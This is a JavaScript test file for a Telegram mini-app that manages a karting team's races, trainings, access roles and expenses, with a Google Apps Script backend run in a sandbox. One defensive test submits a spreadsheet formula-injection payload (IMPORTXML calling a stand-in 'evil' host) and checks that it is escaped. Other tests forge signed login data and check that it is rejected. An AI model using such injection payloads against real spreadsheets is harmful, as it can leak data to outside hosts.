import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import vm from 'node:vm';
import { createHmac } from 'node:crypto';
import { buildView, googleCalendarUrl, buildEvents, parseDate, parseMoney } from '../src/logic.js';

const data = {
  'Люди': [
    { Telegram: 'ivan_petrov', 'Имя': 'Иван Петров', 'Пилот': 'Да', 'Менеджер': 'Нет', 'Руководство': 'Нет', 'Активен': 'Да' },
    { Telegram: '@Anna_Smirnova', 'Telegram ID': '555', 'Имя': 'Анна', 'Пилот': 'Да', 'Активен': 'Да' },
    { Telegram: 'max_kart', 'Имя': 'Максим', 'Пилот': 'Да', 'Активен': 'Нет' },
    { Telegram: 'oleg_manager', 'Имя': 'Олег', 'Пилот': 'Да', 'Менеджер': 'Да', 'Активен': 'Да' },
    { Telegram: 'melvn_boss', 'Имя': 'Босс', 'Руководство': 'Да', 'Активен': 'Да' },
    { Telegram: '', 'Telegram ID': '123456', 'Имя': 'Без ника', 'Пилот': 'Да', 'Активен': '' },
  ],
  'События': [
    { ID: 'R1', 'Тип': 'Гонка', 'Формат': 'Командная', 'Чемпионат': 'Кубок Москвы', 'Этап': '3', 'Название': 'Этап 3', 'Дата': '15.11.2026', 'Начало': '10:00', 'Окончание': '18:00', 'Трасса': 'Картодром', 'Стоимость': '10 000 ₽', 'Состав': 'M-ELVN Orange', 'Менеджер': 'oleg_manager', 'Пилоты': 'ivan_petrov, 555' },
    { ID: 'R1', 'Состав': 'M-ELVN Carbon', 'Менеджер': 'melvn_boss', 'Пилоты': 'kirill' },
    { ID: 'R3', 'Тип': 'Гонка', 'Формат': 'Командная', 'Название': 'Только второй состав', 'Дата': '06.12.2026', 'Состав': 'A', 'Пилоты': 'someone' },
    { ID: 'R3', 'Состав': 'B', 'Менеджер': 'oleg_manager', 'Пилоты': 'kirill' },
    { ID: 'R2', 'Тип': 'Гонка', 'Формат': 'Личная', 'Чемпионат': 'RMC', 'Этап': 'Финал', 'Название': '', 'Дата': '22.11.2026', 'Начало': '11:00', 'Стоимость': '5000', 'Менеджер': '', 'Пилоты': 'max_kart; oleg_manager' },
    { ID: 'T1', 'Тип': 'Тренировка', 'Название': 'Тренировка', 'Дата': '08.11.2026', 'Стоимость': '3000', 'Статус': 'Отменено', 'Пилоты': 'anna_smirnova, 123456' },
    { ID: 'X1', 'Тип': 'Гонка', 'Название': 'Чужая гонка', 'Дата': '29.11.2026', 'Пилоты': 'someone_else' },
    { ID: 'BAD', 'Тип': 'Гонка', 'Название': 'Без даты', 'Дата': '' },
  ],
};

const ids = (v) => v.events.map((e) => e.id).sort();

test('pilot sees only races the admin put them in', () => {
  const v = buildView(data, { id: 1, username: 'Ivan_Petrov' }, 'Europe/Moscow');
  assert.equal(v.access, true);
  assert.deepEqual(ids(v), ['R1']);
  const [mine, other] = v.events[0].crews;
  assert.equal(mine.name, 'M-ELVN Orange');
  assert.deepEqual(mine.pilots.map((p) => p.name), ['Иван Петров', 'Анна']);
  assert.equal(mine.pilots[0].me, true);
  assert.equal(mine.mine, true);
  assert.equal(other.name, 'M-ELVN Carbon');
  assert.equal(other.mine, false);
  assert.equal(other.pilots[0].name, '@kirill');
  assert.equal(v.events[0].format, 'team');
});

test('several crews: extra rows with the same ID add crews, not events', () => {
  const events = buildEvents(data['События']);
  assert.deepEqual(events.map((e) => e.id), ['R1', 'R3', 'R2', 'T1', 'X1']);
  assert.equal(events[0].crews.length, 2);
  assert.equal(events[0].title, 'Этап 3');
});

test('championship and stage are passed through; title falls back to them', () => {
  const v = buildView(data, { username: 'oleg_manager' });
  const r1 = v.events.find((e) => e.id === 'R1');
  assert.equal(r1.championship, 'Кубок Москвы');
  assert.equal(r1.stage, 'Этап 3');
  const r2 = v.events.find((e) => e.id === 'R2');
  assert.equal(r2.title, 'RMC — Финал');
  assert.match(decodeURIComponent(r1.calendarUrl), /Чемпионат: Кубок Москвы — Этап 3/);
});

test('training numbered stage becomes "Championship — Тренировка N"', () => {
  const [e] = buildEvents([{ ID: 'T9', 'Тип': 'Тренировка', 'Чемпионат': 'Rotax', 'Этап': '2', 'Дата': '01.12.2026' }]);
  assert.equal(e.title, 'Rotax — Тренировка 2');
  const [f] = buildEvents([{ ID: 'T8', 'Тип': 'Тренировка', 'Чемпионат': 'Rotax', 'Этап': 'Тренировка 5', 'Дата': '01.12.2026' }]);
  assert.equal(f.title, 'Rotax — Тренировка 5');
});

test('myRoles shows the viewer\'s role in each race', () => {
  const oleg = buildView(data, { username: 'oleg_manager' });
  const byId = Object.fromEntries(oleg.events.map((e) => [e.id, e.myRoles]));
  assert.deepEqual(byId.R1, ['manager']);
  assert.deepEqual(byId.R2, ['pilot']);
  const ivan = buildView(data, { username: 'ivan_petrov' });
  assert.deepEqual(ivan.events[0].myRoles, ['pilot']);
  const boss = buildView(data, { username: 'melvn_boss' });
  assert.deepEqual(boss.events.find((e) => e.id === 'R1').myRoles, ['manager']);
  assert.deepEqual(boss.events.find((e) => e.id === 'X1').myRoles, []);
});

test('manager of the second crew sees the race', () => {
  const v = buildView(data, { username: 'oleg_manager' });
  const r3 = v.events.find((e) => e.id === 'R3');
  assert.ok(r3);
  assert.deepEqual(r3.crews.map((c) => c.mine), [false, true]);
});

test('manager sees races where they are manager or pilot, not all races', () => {
  const v = buildView(data, { id: 2, username: 'oleg_manager' });
  assert.deepEqual(ids(v), ['R1', 'R2', 'R3']);
});

test('leadership sees every race with a valid date', () => {
  const v = buildView(data, { id: 3, username: 'melvn_boss' });
  assert.deepEqual(ids(v), ['R1', 'R2', 'R3', 'T1', 'X1']);
});

test('participants can be listed by nick or by Telegram ID', () => {
  const anna = buildView(data, { id: 555 });
  assert.equal(anna.access, true);
  assert.deepEqual(ids(anna), ['R1', 'T1']);
  const noNick = buildView(data, { id: 123456 });
  assert.deepEqual(ids(noNick), ['T1']);
  assert.equal(noNick.events[0].cancelled, true);
});

test('inactive or unknown person has no access', () => {
  assert.equal(buildView(data, { id: 4, username: 'max_kart' }).access, false);
  const v = buildView(data, { id: 5, username: 'stranger' });
  assert.equal(v.access, false);
  assert.equal(v.username, 'stranger');
});

test('events are sorted by date', () => {
  const v = buildView(data, { username: 'melvn_boss' });
  assert.deepEqual(v.events.map((e) => e.id), ['T1', 'R1', 'R2', 'X1', 'R3']);
});

test('calendar link: timed and all-day, with participants', () => {
  const [r1, , , t1] = buildEvents(data['События']);
  const u = new URL(googleCalendarUrl(r1, 'Europe/Moscow'));
  assert.equal(u.searchParams.get('dates'), '20261115T100000/20261115T180000');
  assert.equal(u.searchParams.get('ctz'), 'Europe/Moscow');
  assert.match(u.searchParams.get('details'), /Гонка, Командная/);
  assert.match(u.searchParams.get('details'), /M-ELVN Orange:\nПилоты: @ivan_petrov, @555\nМенеджер: @oleg_manager/);
  assert.match(u.searchParams.get('details'), /M-ELVN Carbon:/);
  const a = new URL(googleCalendarUrl(t1, 'Europe/Moscow'));
  assert.equal(a.searchParams.get('dates'), '20261108/20261109');
  assert.equal(a.searchParams.get('ctz'), null);
});

test('calendar all-day across month end', () => {
  const [e] = buildEvents([{ ID: 'X', 'Дата': '31.12.2026' }]);
  assert.equal(new URL(googleCalendarUrl(e)).searchParams.get('dates'), '20261231/20270101');
});

test('parseDate formats', () => {
  assert.deepEqual(parseDate('5.1.2027'), { y: 2027, m: 1, d: 5 });
  assert.equal(parseDate('завтра'), null);
});

test('parseMoney understands spaces, dots and commas', () => {
  assert.equal(parseMoney('7 000 ₽ с пилота'), 7000);
  assert.equal(parseMoney('10.000'), 10000);
  assert.equal(parseMoney('1 500,50'), 1500.5);
  assert.equal(parseMoney('7 000,00 ₽'), 7000);
  assert.equal(parseMoney('бесплатно'), 0);
});

test('spent: team race cost is split between the pilots of my crew, solo is full', () => {
  const ivan = buildView(data, { username: 'ivan_petrov' }).finance;
  assert.deepEqual(ivan.spent.map((x) => [x.raceId, x.amount]), [['R1', 5000]]);
  assert.equal(ivan.spent[0].category, 'Кубок Москвы');
  const oleg = buildView(data, { username: 'oleg_manager' }).finance;
  assert.deepEqual(oleg.spent.map((x) => [x.raceId, x.amount, x.category]), [['R2', 5000, 'RMC']]);
  // Одиночный пилот в составе командной гонки платит всё; отменённое не считается.
  const anna = buildView(data, { id: 555 }).finance;
  assert.deepEqual(anna.spent.map((x) => [x.raceId, x.amount]), [['R1', 5000]]);
});

test('earned: only my income rows; managers get the form with their races', () => {
  const d = { ...data, 'Заработок': [
    { ID: 'a', 'Менеджер': 'oleg_manager', 'ID гонки': 'R1', 'Сумма': '4 000', 'Комментарий': 'бонус' },
    { ID: 'b', 'Менеджер': 'melvn_boss', 'ID гонки': 'R1', 'Сумма': '9000' },
  ] };
  const oleg = buildView(d, { username: 'oleg_manager' }).finance;
  assert.deepEqual(oleg.earned.map((x) => [x.id, x.amount, x.category, x.note]), [['a', 4000, 'Кубок Москвы', 'бонус']]);
  assert.equal(oleg.canEarn, true);
  assert.deepEqual(oleg.managedRaces.map((r) => r.id), ['R3', 'R1']);
  const ivan = buildView(d, { username: 'ivan_petrov' }).finance;
  assert.equal(ivan.canEarn, false);
  assert.deepEqual(ivan.earned, []);
});

// Запуск собранного dist/Code.gs в песочнице с заглушками сервисов Google.
function loadGas(botToken, sheets) {
  const cache = {};
  const code = readFileSync(new URL('../dist/Code.gs', import.meta.url), 'utf8');
  const signed = (buf) => [...buf].map((b) => (b > 127 ? b - 256 : b));
  const unsigned = (arr) => Buffer.from(arr.map((b) => (b + 256) % 256));
  const ctx = {
    Utilities: {
      newBlob: (s) => ({ getBytes: () => signed(Buffer.from(s, 'utf8')) }),
      computeHmacSha256Signature: (value, key) => signed(createHmac('sha256', unsigned(key)).update(unsigned(value)).digest()),
    },
    PropertiesService: {
      getScriptProperties: () => ({ getProperty: (k) => (k === 'BOT_TOKEN' ? botToken : null) }),
    },
    ContentService: {
      MimeType: { JSON: 'json' },
      createTextOutput: (text) => ({ text, setMimeType() { return this; } }),
    },
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (name) => (sheets[name] ? sheetApi(name) : null),
        insertSheet: (name) => ((sheets[name] = []), sheetApi(name)),
      }),
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    CacheService: { getScriptCache: () => ({ get: (k) => cache[k] ?? null, put: (k, v) => (cache[k] = v) }) },
    console: { error() {} },
  };
  let uuid = 0;
  ctx.Utilities.getUuid = () => 'id' + ++uuid;
  function sheetApi(name) {
    return {
      getDataRange: () => ({ getDisplayValues: () => sheets[name].map((r) => r.map(String)) }),
      appendRow: (row) => sheets[name].push(row),
      deleteRow: (n) => sheets[name].splice(n - 1, 1),
      getRange: (row, col) => ({
        setValue: (v) => {
          while (sheets[name].length < row) sheets[name].push([]);
          sheets[name][row - 1][col - 1] = v;
        },
      }),
      setFrozenRows() {},
    };
  }
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  return (params) => JSON.parse(ctx.doGet({ parameter: params }).text);
}

function signInitData(botToken, user, authDate = Math.floor(Date.now() / 1000)) {
  const params = new URLSearchParams({ auth_date: String(authDate), query_id: 'q', user: JSON.stringify(user) });
  const check = [...params.entries()].map(([k, v]) => `${k}=${v}`).sort().join('\n');
  const secret = createHmac('sha256', 'WebAppData').update(botToken).digest();
  params.set('hash', createHmac('sha256', secret).update(check).digest('hex'));
  return params;
}

const sheetTable = (rows) => {
  const headers = Object.keys(Object.assign({}, ...rows));
  return [headers, headers.map(() => 'подсказка'), ...rows.map((r) => headers.map((h) => r[h] ?? '')), headers.map(() => '')];
};
const gasSheets = { 'Люди': sheetTable(data['Люди']), 'События': sheetTable(data['События']) };

test('Apps Script: valid initData returns the pilot view', () => {
  const doGet = loadGas('123:ABC', gasSheets);
  const initData = signInitData('123:ABC', { id: 42, username: 'ivan_petrov', first_name: 'Иван' }).toString();
  const v = doGet({ initData });
  assert.equal(v.access, true);
  assert.deepEqual(v.events.map((e) => e.id), ['R1']);
  assert.match(v.events[0].calendarUrl, /^https:\/\/calendar\.google\.com\/calendar\/render\?action=TEMPLATE/);
});

test('Apps Script: forged, wrong-token, stale, missing initData or unset token is rejected', () => {
  const doGet = loadGas('123:ABC', gasSheets);
  assert.equal(doGet({}).error, 'not_telegram');
  assert.equal(doGet({ initData: signInitData('123:WRONG', { id: 1, username: 'melvn_boss' }).toString() }).error, 'not_telegram');
  const forged = signInitData('123:ABC', { id: 42, username: 'ivan_petrov' });
  forged.set('user', JSON.stringify({ id: 1, username: 'melvn_boss' }));
  assert.equal(doGet({ initData: forged.toString() }).error, 'not_telegram');
  const old = signInitData('123:ABC', { id: 42, username: 'ivan_petrov' }, 1000);
  assert.equal(doGet({ initData: old.toString() }).error, 'not_telegram');
  const noToken = loadGas(null, gasSheets);
  assert.equal(noToken({ initData: signInitData('', { id: 42, username: 'ivan_petrov' }).toString() }).error, 'not_telegram');
});

test('Apps Script: manager adds and deletes income; others cannot', () => {
  const sheets = JSON.parse(JSON.stringify(gasSheets));
  const doGet = loadGas('123:ABC', sheets);
  const as = (username) => signInitData('123:ABC', { id: 7, username }).toString();

  let v = doGet({ initData: as('oleg_manager'), action: 'addIncome', raceId: 'R1', amount: '4 000', note: 'за этап' });
  assert.equal(v.access, true);
  assert.deepEqual(v.finance.earned.map((x) => [x.raceId, x.amount, x.note]), [['R1', 4000, 'за этап']]);
  assert.equal(sheets['Заработок'][0][0], 'ID');

  // Пилот не может записать доход, менеджер — за чужую гонку.
  assert.equal(doGet({ initData: as('ivan_petrov'), action: 'addIncome', raceId: 'R1', amount: '100' }).error, 'not_manager');
  assert.equal(doGet({ initData: as('oleg_manager'), action: 'addIncome', raceId: 'X1', amount: '100' }).error, 'not_manager');
  assert.equal(doGet({ initData: as('oleg_manager'), action: 'addIncome', raceId: 'R1', amount: 'abc' }).error, 'bad_amount');

  const id = v.finance.earned[0].id;
  assert.equal(doGet({ initData: as('melvn_boss'), action: 'deleteIncome', id }).error, 'not_found');
  v = doGet({ initData: as('oleg_manager'), action: 'deleteIncome', id });
  assert.deepEqual(v.finance.earned, []);
});

test('Apps Script: income note cannot inject a formula; amount and rate are limited', () => {
  const sheets = JSON.parse(JSON.stringify(gasSheets));
  const doGet = loadGas('123:ABC', sheets);
  const initData = signInitData('123:ABC', { id: 7, username: 'oleg_manager' }).toString();
  doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '100', note: '=IMPORTXML("http://evil","//a")' });
  const row = sheets['Заработок'].at(-1);
  assert.equal(row[5], `'=IMPORTXML("http://evil","//a")`);
  assert.equal(doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '99999999' }).error, 'bad_amount');
  assert.equal(doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '-5' }).error, 'bad_amount');
  let last;
  for (let i = 0; i < 40; i++) last = doGet({ initData, action: 'addIncome', raceId: 'R1', amount: '1' });
  assert.equal(last.error, 'too_many');
});

test('Apps Script: errors do not leak details', () => {
  const doGet = loadGas('123:ABC', { 'Люди': [['Telegram'], ['x'], ['ivan_petrov']], get 'События'() { throw new Error('secret path'); } });
  const v = doGet({ initData: signInitData('123:ABC', { id: 1, username: 'ivan_petrov' }).toString() });
  assert.deepEqual(v, { error: 'sheet_unavailable' });
});

const trainingRows = [
  { ID: 'T1', 'Тип': 'Школа', 'Название': '', 'Дата': '08.11.2026', 'Начало': '12:00', 'Трасса': 'PitStop', 'Стоимость заезда': '1 500 ₽', 'Мин. заездов': '2', 'Макс. заездов': '5' },
  { ID: 'T2', 'Название': 'Вечерняя', 'Дата': '09.11.2026', 'Стоимость заезда': '2000', 'Статус': 'Отменена' },
];

test('trainings: everyone with access sees them; signup laps × lap cost goes to spent', () => {
  const d = { ...data, 'Тренировки': trainingRows, 'Записи на тренировки': [
    { ID: 's1', 'Пилот': 'ivan_petrov', 'ID тренировки': 'T1', 'Заездов': '2' },
    { ID: 's2', 'Пилот': '@Ivan_Petrov', 'ID тренировки': 'T1', 'Заездов': '3' },
    { ID: 's3', 'Пилот': 'ivan_petrov', 'ID тренировки': 'T2', 'Заездов': '4' },
    { ID: 's4', 'Пилот': 'oleg_manager', 'ID тренировки': 'T1', 'Заездов': '1' },
  ] };
  const ivan = buildView(d, { username: 'ivan_petrov' });
  assert.deepEqual(ivan.trainings.map((t) => [t.id, t.title, t.myLaps, t.maxLaps]), [['T1', 'Школа', 3, 5], ['T2', 'Вечерняя', 4, 10]]);
  assert.deepEqual(ivan.trainings[0].going.map((g) => [g.name, g.laps, g.me]), [['Иван Петров', 3, true], ['Олег', 1, false]]);
  // Последняя запись действует, отменённая тренировка в расходы не идёт.
  const tr = ivan.finance.spent.filter((x) => x.category === 'Тренировки');
  assert.deepEqual(tr.map((x) => [x.raceId, x.amount, x.laps, x.lapCost]), [['T1', 4500, 3, 1500]]);
  assert.match(decodeURIComponent(ivan.trainings[0].calendarUrl), /1 500 ₽ за заезд, 3 заезда/);
  // Без листов всё работает как раньше.
  assert.deepEqual(buildView(data, { username: 'ivan_petrov' }).trainings, []);
});

test('Apps Script: pilot signs up for a training, changes laps and cancels', () => {
  const sheets = { ...JSON.parse(JSON.stringify(gasSheets)), 'Тренировки': sheetTable(trainingRows) };
  const doGet = loadGas('123:ABC', sheets);
  const initData = signInitData('123:ABC', { id: 42, username: 'ivan_petrov' }).toString();

  let v = doGet({ initData, action: 'signTraining', trainingId: 'T1', laps: '2' });
  assert.equal(v.trainings[0].myLaps, 2);
  assert.equal(sheets['Записи на тренировки'][0][0], 'ID');
  v = doGet({ initData, action: 'signTraining', trainingId: 'T1', laps: '4' });
  assert.equal(v.trainings[0].myLaps, 4);
  assert.equal(sheets['Записи на тренировки'].length, 3);
  assert.deepEqual(v.finance.spent.filter((x) => x.raceId === 'T1').map((x) => x.amount), [6000]);

  assert.equal(doGet({ initData, action: 'signTraining', trainingId: 'T1', laps: '6' }).error, 'bad_laps');
  assert.equal(doGet({ initData, action: 'signTraining', trainingId: 'T1', laps: '1' }).error, 'bad_laps');
  assert.equal(doGet({ initData, action: 'signTraining', trainingId: 'T1', laps: '=1+1' }).error, 'bad_laps');
  assert.equal(doGet({ initData, action: 'signTraining', trainingId: 'T2', laps: '1' }).error, 'no_training');
  assert.equal(doGet({ initData, action: 'signTraining', trainingId: 'X', laps: '1' }).error, 'no_training');

  // Чужая запись не трогается.
  const boss = signInitData('123:ABC', { id: 1, username: 'melvn_boss' }).toString();
  doGet({ initData: boss, action: 'unsignTraining', trainingId: 'T1' });
  v = doGet({ initData, action: 'unsignTraining', trainingId: 'T1' });
  assert.equal(v.trainings[0].myLaps, 0);
  assert.equal(sheets['Записи на тренировки'].length, 2);
});

test('Apps Script: trainings sheet is created on first open', () => {
  const sheets = JSON.parse(JSON.stringify(gasSheets));
  const doGet = loadGas('123:ABC', sheets);
  doGet({ initData: signInitData('123:ABC', { id: 42, username: 'ivan_petrov' }).toString() });
  assert.equal(sheets['Тренировки'][0][8], 'Стоимость заезда');
});

test('Apps Script: missing training columns are added to an existing sheet', () => {
  const sheets = { ...JSON.parse(JSON.stringify(gasSheets)), 'Тренировки': [['ID', 'Дата', 'Трасса'], ['', '', '']] };
  const doGet = loadGas('123:ABC', sheets);
  doGet({ initData: signInitData('123:ABC', { id: 42, username: 'ivan_petrov' }).toString() });
  const h = sheets['Тренировки'][0];
  assert.deepEqual(h.slice(0, 3), ['ID', 'Дата', 'Трасса']);
  assert.ok(h.includes('Тип') && h.includes('Мин. заездов') && h.includes('Макс. заездов'));
  assert.equal(new Set(h).size, h.length);
});
